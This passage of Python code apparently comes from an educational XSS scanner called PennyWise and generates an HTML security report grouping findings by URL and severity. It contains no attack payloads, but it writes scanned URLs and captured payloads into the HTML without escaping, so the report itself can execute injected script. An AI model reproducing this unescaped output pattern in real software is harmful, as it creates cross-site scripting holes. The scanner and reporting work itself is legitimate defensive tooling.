            color: white;
            padding: 8px 15px;
            font-weight: bold;
        }}
        .severity-content {{
            padding: 10px;
            background-color: #f9f9f9;
        }}
        .finding {{
            background-color: white;
            margin-bottom: 10px;
            padding: 15px;
            border-radius: 3px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }}
        .finding-title {{
            font-weight: bold;
            margin-bottom: 5px;
            color: #2c3e50;
        }}
        .finding-details {{
            font-size: 14px;
            color: #555;
        }}
        .screenshots {{
            padding: 20px;
            background-color: #f9f9f9;
            margin-top: 30px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }}
        .recommendations {{
            background-color: #e9f7ef;
            padding: 20px;
            margin-top: 30px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }}
        .footer {{
            margin-top: 30px;
            text-align: center;
            font-size: 12px;
            color: #777;
        }}
        .collapsible {{
            cursor: pointer;
        }}
        .collapsible:after {{
            content: ' +';
            font-weight: bold;
        }}
        .active:after {{
            content: ' -';
        }}
        .content {{
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.2s ease-out;
        }}
    </style>
</head>
<body>
    <div class="header">
        <h1>PennyWise XSS Security Report</h1>
        <p>Generated on: {time.strftime('%B %d, %Y')}</p>
    </div>

    <div class="summary">
        <h2>Executive Summary</h2>
        <p>The security scan identified <strong>{sum(len(items) for items in categorized.values())}</strong> potential vulnerabilities across <strong>{len(url_based_findings)}</strong> unique URLs. This report organizes findings by URL and severity to provide a clear view of security issues.</p>
    </div>

    <div class="category-chart">
        <h2>Vulnerability Distribution</h2>
        <div class="bar-chart">
"""
    
    # Add category bars
    categories = list(categorized.keys())
    counts = [len(categorized[cat]) for cat in categories]
    max_count = max(counts) if counts else 1
    
    category_colors = {
        "Reflected XSS candidates": "#e74c3c",
        "Stored XSS candidates (form POST)": "#c0392b",
        "Form-based reflected (GET) candidates": "#e67e22",
        "DOM-based risks": "#f1c40f",
        "JavaScript Execution (Alert)": "#d35400",
        "Cookie Security Issues": "#3498db",
        "Other/Misc": "#95a5a6"
    }
    
    for i, cat in enumerate(categories):
        count = len(categorized[cat])
        if count > 0:
            width_percent = (count / max_count) * 100
            color = category_colors.get(cat, "#95a5a6")
            html += f"""
            <div class="bar-container">
                <div class="bar-label">{cat} ({count})</div>
                <div class="bar" style="width: {width_percent}%; background-color: {color};"></div>
            </div>
"""
    
    html += """
        </div>
    </div>

    <h2>Detailed Findings by URL</h2>
"""
    
    # Add URL sections
    for url, findings in url_based_findings.items():
        html += f"""
    <div class="url-section">
        <div class="url-header">{url}</div>
        <div class="url-content">
"""
        
        # Group findings by severity
        high_severity = []
        medium_severity = []
        low_severity = []
        
        for finding in findings:
            category = finding.get("category", "")
            finding_type = finding.get("type", "")
            
            # Determine severity based on finding type and category
            if "Stored XSS" in category or "JavaScript Execution" in category or finding_type == "reflected-js-alert":
                high_severity.append(finding)
            elif "Reflected XSS" in category or "DOM-based" in category:
                medium_severity.append(finding)
            else:
                low_severity.append(finding)
        
        # Display findings by severity
        for severity, items, color in [
            ("High", high_severity, severity_colors["high"]),
            ("Medium", medium_severity, severity_colors["medium"]),
            ("Low", low_severity, severity_colors["low"])
        ]:
            if items:
                html += f"""
            <div class="severity">
                <div class="severity-header collapsible" style="background-color: {color};">{severity} Severity Issues ({len(items)})</div>
                <div class="content">
                    <div class="severity-content">
"""
                
                for i, item in enumerate(items, 1):
                    # Get relevant details based on finding type
                    details = []
                    if "payload" in item:
                        details.append(f"<strong>Payload:</strong> {item['payload']}")
                    if "param" in item:
                        details.append(f"<strong>Parameter:</strong> {item['param']}")
                    if "field" in item:
                        details.append(f"<strong>Field:</strong> {item['field']}")
                    if "pattern" in item:
                        details.append(f"<strong>Pattern:</strong> {item['pattern']}")
                    if "alert_text" in item:
                        details.append(f"<strong>Alert:</strong> {item['alert_text']}")
                    if "method" in item:
                        details.append(f"<strong>Method:</strong> {item['method'].upper()}")
                    if "subtype" in item:
                        details.append(f"<strong>Subtype:</strong> {item['subtype']}")
                    
                    issue_type = item.get("type", "Unknown").upper()
                    detail_str = " | ".join(details)
                    
                    html += f"""
                        <div class="finding">
                            <div class="finding-title">{i}. {issue_type}</div>
                            <div class="finding-details">{detail_str}</div>
                        </div>
"""
                
                html += """
                    </div>
                </div>
            </div>
"""
        
        if not (high_severity or medium_severity or low_severity):
            html += """
            <p><em>No specific vulnerabilities detected</em></p>
"""
        
        html += """
        </div>
    </div>
"""
    
    # Add screenshots section
    html += """
    <div class="screenshots">
        <h2>Evidence & Screenshots</h2>
        <p>Screenshots of crawled pages and detected vulnerabilities are saved in the 'screenshots' directory. These images provide visual evidence of the security issues identified during scanning.</p>
    </div>
"""
    
    # Add recommendations section
    html += """
    <div class="recommendations">
        <h2>Recommendations</h2>
        <h3>General Security Recommendations:</h3>
        <ol>
            <li>Implement proper input validation and output encoding for all user inputs.</li>
            <li>Use Content Security Policy (CSP) to mitigate XSS attacks.</li>
            <li>Apply the principle of least privilege when handling user-supplied data.</li>
            <li>Utilize security frameworks and libraries that automatically escape output.</li>
            <li>Regularly conduct security testing and code reviews.</li>
        </ol>
    </div>

    <div class="footer">
        <p>Report generated by PennyWise XSS Scanner | For educational use only</p>
    </div>

    <script>
        // JavaScript to make sections collapsible
        const coll = document.getElementsByClassName("collapsible");
        for (let i = 0; i < coll.length; i++) {
            coll[i].addEventListener("click", function() {
                this.classList.toggle("active");
                const content = this.nextElementSibling;
                if (content.style.maxHeight) {
                    content.style.maxHeight = null;
                } else {
                    content.style.maxHeight = content.scrollHeight + "px";
                }
            });
            
            // Expand the section by default
            const content = coll[i].nextElementSibling;
            content.style.maxHeight = content.scrollHeight + "px";
        }
    </script>
</body>
</html>
"""
    
    # Write the HTML to a file
    report_path = os.path.join(os.path.dirname(__file__), '..', filename)
    with open(report_path, 'w', encoding='utf-8') as f:
        f.write(html)
    
    print(f"HTML report generated: {report_path}")
    return report_path

# Replace the old generate_pdf_report function with HTML report generation
def generate_pdf_report(categorized, filename="xss_report.pdf"):
    """
    Wrapper for backward compatibility - now generates HTML report instead of PDF
    """
    return generate_html_report(categorized, filename="xss_report.html")